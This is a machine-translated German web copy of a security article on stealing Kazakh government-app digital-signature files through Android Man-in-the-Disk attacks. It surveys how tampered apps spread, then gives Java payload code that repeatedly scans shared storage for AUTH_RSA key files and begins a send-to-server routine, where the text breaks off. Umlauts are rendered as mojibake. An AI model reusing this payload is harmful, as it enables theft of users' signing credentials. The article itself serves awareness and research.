<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèº‚Äçüç≥ üèùÔ∏è ü§æüèæ EDS mit Man-In-The-Disk stehlen ü§∞üèº ü•û üëÆ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die mobilen Anwendungen in Kasachstan, mEGOV und UAPF, verwenden digitale Signaturen als eine der Autorisierungsmethoden. Um sich auf diese Weise anzu...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>EDS mit Man-In-The-Disk stehlen</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460993/"><p> Die mobilen Anwendungen in Kasachstan, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">mEGOV</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">UAPF,</a> verwenden <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">digitale Signaturen</a> als eine der Autorisierungsmethoden.  Um sich auf diese Weise anzumelden, m√ºssen Sie die Datei von der digitalen Signatur auf das Telefon √ºbertragen.  Diese Autorisierungsmethode ist anf√§llig f√ºr einen Man-In-The-Disk-Angriff (mehr dazu weiter unten).  Um Opfer eines Angriffs zu werden, m√ºssen Sie nur eine Ihrer Lieblingsanwendungen installieren, die von einem Angreifer heimlich ge√§ndert wurde.  Ich werde zeigen, wie das geht.  Finden Sie zun√§chst heraus, wie solche Anwendungen zum Benutzer gelangen k√∂nnen. <a name="habracut"></a></p><br><h2 id="kak-vredonosnye-prilozheniya-popadayut-na-telefon">  Wie b√∂sartige Anwendungen auf das Telefon gelangen </h2><br><h3 id="lokalnye-markety-prilozheniy-kitaya-irana-i-td">  Lokale Anwendungsm√§rkte in China, Iran usw. </h3><br><p>  Beispiele: cafebazaar.ir, android.myapp.com, apkplz.net </p><br><p>  Diese Websites wurden aufgrund von Zensur und Blockierung von Google-Diensten und / oder Servern offizieller Anwendungen angezeigt.  Normalerweise enthalten sie lokale Analoga beliebter Anwendungen und deren Modifikationen.  Solche Modifikationen (wie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dieses iranische Telegramm</a> ) enthalten angeblich neue, coole Funktionen.  Was ist die Gefahr solcher Anwendungen?  Man wei√ü nie, was sie wirklich tun.  Dar√ºber hinaus verpassen einige Regierungen die Gelegenheit nicht und ver√∂ffentlichen ihre √Ñnderungen mit Tools zur Verfolgung des Benutzers.  Regierungs-Spionage-Apps sind per Definition b√∂sartig.  Einmal habe ich eine b√∂sartige Anwendung untersucht ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Virustotal-Ergebnis</a> , Beispiel <a href="">hier</a> , Passwort: infiziert), die das Telefon nach Telegrammklonen durchsucht hat: </p><br><pre><code class="plaintext hljs">"com.hanista.mobogram" "org.ir.talaeii" "ir.hotgram.mobile.android" "ir.avageram.com" "org.thunderdog.challegram" "ir.persianfox.messenger" "com.telegram.hame.mohamad" "com.luxturtelegram.black" "com.talla.tgr" "com.mehrdad.blacktelegram"</code> </pre> <br><p>  Diese Liste zeigt die tats√§chliche Relevanz und Beliebtheit solcher Anwendungen.  Die Untersuchung dieser Malware hat mich zu einem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Artikel gef√ºhrt</a> , in dem es um einen Telegrammklon <em>geht</em> , der von der iranischen Regierung √ºber den <em>Cafebazaar-</em> Markt verteilt wird.  Zitat von dort: </p><br><blockquote>  Dies scheint nach den Vorgaben der iranischen Regierung entwickelt zu werden, damit sie jedes von den Nutzern der App vorgeschlagene Bit und Byte verfolgen k√∂nnen. </blockquote><p>  Wie viele Telegrammklone sehen Sie ?: ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle</a> ) </p><br><p><img src="https://habrastorage.org/webt/bg/l2/k1/bgl2k1slpn6zgcegcnwmvssgo_o.png" alt="Bild"></p><br><p>  F√ºr normale Benutzer ist es fast unm√∂glich, sich davor zu sch√ºtzen, da es keine andere Wahl gibt - offizielle Quellen werden intensiv blockiert und ihre eigenen werden beworben.  Forscher und Antiviren-Unternehmen aus der ganzen Welt melden dies nach der Identifizierung infizierter Anwendungen unverz√ºglich an Google und werden aus dem Play Market entfernt, der offensichtlich nicht f√ºr Anwendungsm√§rkte von Drittanbietern gilt.  Die Richtlinien von Google zur Zulassung gehosteter Anwendungen gelten auch nicht f√ºr diese. </p><br><p>  Einige der M√§rkte sind sehr beliebt, wie beispielsweise die <em>Tencent My App</em> mit 260 Millionen Nutzern pro Monat ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle</a> ) </p><br><p><img src="https://habrastorage.org/webt/kb/cy/_4/kbcy_4bdvjpqe0m7flp9kvuhqlm.png" alt="Bild"></p><br><p>  Lokale Anwendungen, die in derselben Region / demselben Land verwendet werden, verwenden h√§ufig dasselbe SDK (Satz von Bibliotheken) f√ºr die Verfolgung von Werbung und die soziale Integration.  Netzwerke usw. ... Wenn dieselbe Bibliothek in mehreren Anwendungen verwendet wird, k√∂nnen mit hoher Wahrscheinlichkeit einige dieser Anwendungen auf einem Benutzer installiert werden.  Solche Bibliotheken k√∂nnen die Funktionen verschiedener Anwendungen, in die sie integriert sind, verwenden, um Benutzerdaten zu stehlen und die erteilten Berechtigungen zu umgehen.  Beispielsweise hat eine Anwendung Zugriff auf den Empfang von IMEI, jedoch keinen Zugriff auf das Internet.  Die eingebaute Bibliothek wei√ü davon und liest daher die IMEI und speichert sie auf der SD-Karte in einem versteckten Ordner.  Dieselbe Bibliothek ist in eine andere Anwendung integriert, die √ºber einen Internetzugang, jedoch keinen Zugriff auf IMEI verf√ºgt, sie aus einem versteckten Ordner liest und an ihren Server sendet.  Diese Methode wurde von zwei chinesischen Unternehmen, Baidu und Salmonads, angewendet.  Mehr dazu lesen Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . </p><br><h3 id="fishing">  Phishing </h3><br><p>  Klassisches Phishing ist das Hauptinstrument internationaler Gruppen und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">spezieller Dienste verschiedener L√§nder</a> .  Wie so oft wird eine regul√§re Messenger-Anwendung verwendet, Funktionen zum Verfolgen hinzugef√ºgt und dann massiv verteilt, mit der Markierung "Schau, was f√ºr eine coole Anwendung f√ºr die Kommunikation."  Die Lieferung an Benutzer kann √ºber soziale Netzwerke erfolgen.  Netzwerke, Spam WhatsApp / Telegramm, integrierte Anzeigen auf Websites usw. </p><br><p><img src="https://habrastorage.org/webt/r6/tc/l7/r6tcl7dsdaqv4q-smmh2v-_67tk.png" alt="Bild"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle, S. 19.</a> </p><br><p>  Phishing-Links in Form von Beitr√§gen auf Facebook: </p><br><p><img src="https://habrastorage.org/webt/hy/zy/os/hyzyosiig_lrebvyhsw38am4m8o.png" alt="Bild"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle, S. 22</a> </p><br><p>  Popup auf einer ber√ºhmten Seite </p><br><p><img src="https://habrastorage.org/webt/v9/8q/m1/v98qm1pkrd2mt90zrmjktwwow60.png" alt="Bild"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle</a> </p><br><h3 id="telegram-botygruppy">  Telegramm-Bots / Gruppen </h3><br><p>  Beispiel: @apkdl_bot, t.me/fun_android </p><br><p>  Es gibt Telegramm-Bots zum Herunterladen von APK-Dateien.  Anstelle einer legitimen Anwendung k√∂nnen sie Malware in Sie eindringen lassen.  Oder infizieren Sie Ihre gew√ºnschte Anwendung im laufenden Betrieb.  Das funktioniert so: Sie geben den Befehl bot / group ein, den Sie "Instagram" herunterladen m√∂chten. Das Skript auf der anderen Seite l√§dt es von Google Play herunter, entpackt es, f√ºgt sch√§dlichen Code hinzu, packt es zur√ºck und gibt es an Sie zur√ºck.  Wie dies automatisch gemacht wird, werde ich versuchen, in naher Zukunft ein Beispiel zu zeigen. </p><br><h3 id="storonnie-sayty-posredniki">  Vermittlungsstellen von Drittanbietern </h3><br><p>  Beispiel: apkpure.com, apkmirror.com, apps.evozi.com/apk-downloader/ </p><br><p>  Es gibt eine gro√üe Anzahl inoffizieller Websites zum Herunterladen von Android-Anwendungen.  Einige von ihnen bieten die M√∂glichkeit, Ihre Anwendung herunterzuladen, was m√∂glicherweise sch√§dlich ist.  Beispiel auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dieser Site</a> herunterladen: </p><br><p><img src="https://habrastorage.org/webt/om/sb/lt/omsblt9mpidhrw9zljs0ejexlmc.png" alt="Bild"></p><br><p>  Ein Beispiel f√ºr eine Malvari, die sich auf diese Weise verbreitet hat ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle</a> ): </p><br><p><img src="https://habrastorage.org/webt/zb/n3/te/zbn3tewawcdn0cyfilfmwzqo4wg.jpeg" alt="Bild"></p><br><p>  Beispielstatistiken f√ºr inoffizielle Quellen finden Sie im <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Android-Sicherheitsbericht 2018</a> - 1,6 Milliarden blockierte Google Play Protect-Installationen, die nicht von Google Play stammen.  Es gab viel mehr Installationen. <br>  Einige schreiben sogar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Artikel</a> dar√ºber, wie gut es ist, M√§rkte von Drittanbietern zu nutzen. <br>  Eine separate ganze Welt besteht aus Websites, die Anwendungen ohne Werbung vertreiben, kostenpflichtigen gehackten kostenpflichtigen Anwendungen und Anwendungen mit zus√§tzlichen Funktionen: </p><br><p><img src="https://habrastorage.org/webt/dh/il/oh/dhilohxhl2btapm67zmyt68drb0.png" alt="Bild"></p><br><p><img src="https://habrastorage.org/webt/fe/yv/si/feyvsif5ius3rfkc7dhxayt9onw.png" alt="Bild"></p><br><h3 id="google-play">  Google Play </h3><br><p>  Die offizielle Quelle bietet Schutz vor verd√§chtigen Anwendungen namens Google Play Protect, bei denen mithilfe des maschinellen Lernens der Grad der Malware ermittelt wird.  Ein solcher Schutz kann jedoch nicht genau verstehen, welche Anwendung sch√§dlich ist und welche nicht, da dies eine vollst√§ndige manuelle √úberpr√ºfung erfordert.  Was ist der Unterschied zwischen einer Spionage-App, die alle Ihre Bewegungen √ºberwacht, und einer laufenden App?  Forscher <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">finden</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">st√§ndig</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hunderte</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">infizierter</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Anwendungen,</a> die auf Google Play ver√∂ffentlicht wurden. </p><br><p>  Normalerweise nennt sich eine b√∂swillige Anwendung <em>Google Play Services</em> oder auf √§hnliche Weise und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">setzt ein √§hnliches Symbol</a> .  Dies ist f√ºr Benutzer irref√ºhrend.  Warum Google Play das Symbol nicht auf √Ñhnlichkeit mit seinen offiziellen Anwendungen √ºberpr√ºft, ist unklar.  Einmal in einem Telegramm habe ich einen Avatar mit einem Papierflugzeug platziert und sie haben mich blockiert.  Eine andere Methode, die von b√∂swilligen Anwendungen verwendet wird, besteht darin, die Buchstaben ("L" durch "I", "g" durch "q") zu ersetzen, um einen Namen zu erstellen, der der offiziellen Anwendung √§hnelt: </p><br><p><img src="https://habrastorage.org/webt/ns/da/fa/nsdafar3chowitbxqf_k0lsmiki.png" alt="Bild"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Quelle</a> </p><br><h3 id="drugie-sposoby">  Andere Wege </h3><br><ol><li><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">In Telefonreparaturdiensten</a> </p><br></li><li><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Beim √úberqueren der Grenze</a> </p><br></li><li><p>  Stellen Sie √ºber USB eine Verbindung zu einem unbekannten Computer her, wobei das Debuggen aktiviert ist. </p><br></li><li><p>  Ein Angreifer, der Zugriff auf Ihr Google-Konto erh√§lt und die Anwendung √ºber Google Play auf Ihrem Telefon installiert. </p><br></li><li><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Vorinstallierte Anwendungen</a> </p><br></li><li><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Auf gerichtliche Anordnung und ohne.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Von der Polizei oder Sonderdiensten</a> </p><br></li><li><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Wasserlochangriff</a> </p><br></li><li><p>  Sie sind gekommen, um einen Freund zu besuchen, und sein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Fernseher hat Ihr Telefon infiziert</a> </p><br></li></ol><br><blockquote>  Die auf Fire TV-Ger√§ten angezeigte Version installiert sich selbst als App namens "Test" mit dem Paketnamen "com.google.time.timer".  Sobald es ein Android-Ger√§t infiziert, beginnt es, die Ressourcen des Ger√§ts zu verwenden, um Kryptow√§hrungen abzubauen, und versucht, sich auf andere Android-Ger√§te im selben Netzwerk zu verbreiten. </blockquote><br><h2 id="kak-zloumyshlenniki-zarazhayut-android-prilozheniya">  Wie Angreifer Android-Anwendungen infizieren </h2><br><p>  Jetzt wissen wir, wie eine sch√§dliche Anwendung auf Ihr Telefon gelangen kann.  Als n√§chstes wird gezeigt, wie ein Angreifer jede Android-Anwendung √§ndern kann.  Ein Beispiel wird f√ºr die Implementierung des Codes im beliebten Spiel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Fruit Ninja verwendet</a> .  Der Code durchsucht den Speicher des Telefons, sucht mit EDS nach einer Datei und sendet sie an den Server (root ist nat√ºrlich nicht erforderlich). </p><br><h3 id="chto-takoe-man-in-the-disk">  Was ist Man-In-The-Disk? </h3><br><p>  Die √ñffentlichkeit machte nach diesem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Artikel</a> auf diesen Angriffsvektor aufmerksam.  Ich rate Ihnen, es zuerst zu lesen. </p><br><p>  <em>F√ºr diejenigen, die gelesen haben, m√∂chte ich hinzuf√ºgen, dass das √Ñndern der freigegebenen Dateien anderer Anwendungen auch zur Ausnutzung von Sicherheitsl√ºcken in Bibliotheken f√ºhren kann, die diese Dateien verwenden</em> </p><br><p>  Wer nicht gelesen hat, werde ich kurz erz√§hlen.  Lassen Sie uns zun√§chst Konzepte definieren.  In Android ist der Speicher f√ºr Anwendungen in internen Speicher und externen Speicher unterteilt.  Interner Speicher ist der interne Speicher der Anwendung, auf den nur er und niemand anderes zugreifen kann.  Absolut jede Anwendung auf dem Telefon entspricht einem separaten Benutzer und einem separaten Ordner mit Rechten nur f√ºr diesen Benutzer.  Dies ist ein gro√üartiger Abwehrmechanismus.  Externer Speicher - der Hauptspeicher des Telefons, auf den alle Anwendungen zugreifen k√∂nnen (dazu geh√∂rt auch die SD-Karte).  Warum wird es ben√∂tigt?  Nehmen Sie eine Fotoeditor-Anwendung.  Nach der Bearbeitung m√ºssen Sie das Foto speichern, damit es √ºber die Galerie zug√§nglich ist.  Wenn Sie es im internen Speicher ablegen, steht es nat√ºrlich niemandem au√üer Ihrer Anwendung zur Verf√ºgung.  Oder ein Browser, der alle Dateien in den freigegebenen Ordner Downloads herunterl√§dt. </p><br><p>  Jede Android-Anwendung verf√ºgt √ºber eigene Berechtigungen, die sie anfordert.  Aber es ist nicht so gut mit ihnen.  Unter ihnen gibt es solche, die Menschen bereitwillig schlie√üen und nicht ernst nehmen.  Darunter befindet sich READ_EXTERNAL_STORAGE.  Damit kann die Anwendung auf den Hauptspeicher des Telefons und damit auf alle Daten anderer Anwendungen zugreifen.  Schlie√ülich wird sich niemand wundern, wenn die Notebook-Anwendung nach dieser Erlaubnis fragt.  M√∂glicherweise muss er Einstellungen speichern und dort zwischenspeichern.  Das Manipulieren von Daten aus anderen Anwendungen im externen Speicher ist der Man-In-The-Disk-Angriff.  Eine andere, fast standardm√§√üige Aufl√∂sung ist INTERNET.  Wie der Name schon sagt, kann die Anwendung auf das Netzwerk zugreifen.  Das Traurigste ist, dass dem Benutzer kein spezielles Fenster angezeigt wird, in dem er aufgefordert wird, diese Berechtigung zu erteilen.  Sie schreiben es einfach in Ihre Bewerbung und sie geben es Ihnen. </p><br><p>  Ich habe die 15 besten kasachischen Anwendungen heruntergeladen und ein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Skript geschrieben</a> , das Statistiken zu den angeforderten Berechtigungen anzeigt.  Wie Sie sehen k√∂nnen, sind READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE und INTERNET sehr beliebt.  Dies bedeutet, dass Angreifer Code, der in den meisten Anwendungen digitale Signaturen stiehlt, weniger schmerzhaft einbetten k√∂nnen. </p><br>  Liste der getesteten Anwendungen <br>  2-GIS, AliExpress, Chocofood, Chrome, InDriver, Instagram, Kaspi, Kolesa, Krisha, Telegramm, VK, WhatsApp, Yandex Music, Yandex Taxi <br>  , Zakon KZ <br><br><p><img src="https://habrastorage.org/webt/hz/sj/uj/hzsjujj6x9k57felsqehjr7m0za.png" alt="Bild"></p><br><p>  Wenn Sie WhatsApp auf ein verwurzeltes Telefon legen, wird Ihre gesamte Korrespondenz im Klartext gespeichert.  Anscheinend h√§lt WhatsApp es nicht f√ºr notwendig, auf einem solchen "besch√§digten" Telefon √ºberhaupt eine Verschl√ºsselung zu verwenden.  Au√üerdem speichert WhatsApp im externen Speicher SSLSessionCache (dateibasierter Cache etablierter SSL-Sitzungen).  In Zukunft werde ich versuchen, herauszufinden, wie Sie diese Dateien verwenden k√∂nnen, die vom Telefon eines anderen empfangen wurden. </p><br><p>  Telegramme und Instagram speichern zwischengespeicherte Bilder im gemeinsamen Speicher.  Fast alle Fotos, die Sie anzeigen, und die Fotos, die Sie sich gegenseitig senden, sind f√ºr jede Anwendung auf Ihrem Telefon verf√ºgbar. </p><br><p><img src="https://habrastorage.org/webt/ey/jb/ol/eyjbolqxrjqp3ewfjbpkzldufw0.png" alt="Bild"></p><br><p>  F√ºr MEGOV- und ENPF-Anwendungen muss sich die digitale Signatur im externen Speicher befinden: </p><br><p><img src="https://habrastorage.org/webt/7v/h1/r5/7vh1r51l1hodhonpnnt06xifsxw.png" alt="Bild"></p><br><p><img src="https://habrastorage.org/webt/dh/q0/jr/dhq0jrc0gdwghwvbuynga8jzvjk.png" alt="Bild"></p><br><p>  Google ist sich des Problems bewusst und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ist dabei,</a> READ_EXTERNAL_STORAGE in Android Q <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zu √§ndern</a> . Zitat: </p><br><blockquote>  Um auf andere Dateien zugreifen zu k√∂nnen, die von einer anderen App erstellt wurden, einschlie√ülich Dateien in einem "Downloads" -Verzeichnis, muss Ihre App das Storage Access Framework verwenden, mit dem der Benutzer eine bestimmte Datei ausw√§hlen kann. </blockquote><br><h2 id="sozdaem-payload">  Nutzdaten erstellen </h2><br><p>  Kommen wir zur Hauptfunktion des Scanners.  Es wird aus drei Hauptklassen bestehen: <code>StageAttack</code> , <code>MaliciousService</code> , <code>MaliciousTaskManager</code> . </p><br><p><img src="https://habrastorage.org/webt/wh/ru/wy/whruwyym3bmbuogp7apjivk3gm4.png" alt="Bild"></p><br><p>  <code>StageAttack</code> - besteht aus einer statischen Methode, die unseren Angriff startet.  Wir erstellen speziell eine statische √úbergangsmethode, um die Implementierung in der fertigen Klasse zu vereinfachen. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">StageAttack</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pwn</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context ctx)</span></span></span><span class="hljs-function"> </span></span>{ Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(ctx, MaliciousService.class); ctx.startService(intent); } }</code> </pre> <br><p>  <code>MaliciousService</code> ist ein Dienst, der den gesamten externen Speicher rekursiv durchsucht. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pwn2</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(File dir)</span></span></span><span class="hljs-function"> </span></span>{ String path = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; File[] list = dir.listFiles(); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (File f : list) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (f.isDirectory()) { path = pwn2(f); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (path != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> path; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { path = f.getAbsolutePath(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (path.contains(<span class="hljs-string"><span class="hljs-string">"AUTH_RSA"</span></span>)) { Log.d(TAG, <span class="hljs-string"><span class="hljs-string">"AUTH_RSA found here - "</span></span> + path); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> path; } } } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; }</code> </pre> <br><p>  Wenn das EDS nicht gefunden wird, wiederholen wir die Suche alle 5 Sekunden, bis wir es finden.  Sie k√∂nnen ein beliebiges Intervall verwenden.  Bei zu kurzen Intervallen besteht die Gefahr, dass unser Service vom System gestoppt wird.  Je h√∂her die Android-Version, desto strenger die Richtlinien f√ºr den Betrieb von Hintergrundprozessen.  Wir k√∂nnen den Vordergrunddienst auch nicht verwenden, da hierf√ºr st√§ndig eine Benachrichtigung h√§ngen muss.  Da ich kein Android-Entwickler bin, habe ich viel Zeit damit verbracht, einen Weg zu finden, um eine Aufgabe zu planen, die p√ºnktlich erledigt wird.  Es ist nicht so einfach wie es scheint.  In Android werden hierf√ºr verschiedene Methoden empfohlen (JobService, WorkManager, setRepeating () AlarmManager).  In der Dokumentation wird nicht ausdr√ºcklich angegeben, dass das Intervall der Aufgabe mindestens 15 Minuten betragen sollte und die Ausf√ºhrungszeit vom Wunsch des Systems abh√§ngt.  Dies passt nicht zu uns, daher verwenden wir die <code>AlarmManager</code> Klasse, die <code>setExactAndAllowWhileIdle()</code> -Methode.  Wenn die Aufgabe abgeschlossen ist, planen wir sie erneut im gleichen Intervall.  Dies ist die einzige mir derzeit bekannte Methode mit der h√∂chsten Genauigkeit. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">scheduleMalService</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ Context ctx = getApplicationContext(); AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE); Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(ctx, MaliciousTaskManager.class); <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> _id = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>) System.currentTimeMillis(); PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, <span class="hljs-number"><span class="hljs-number">0</span></span>); alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + <span class="hljs-number"><span class="hljs-number">5000</span></span>, alarmIntent); }</code> </pre> <br><p>  Wenn ein EDS gefunden wird, senden wir die Datei an den Server: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sendToServer</span></span></span><span class="hljs-params"><span 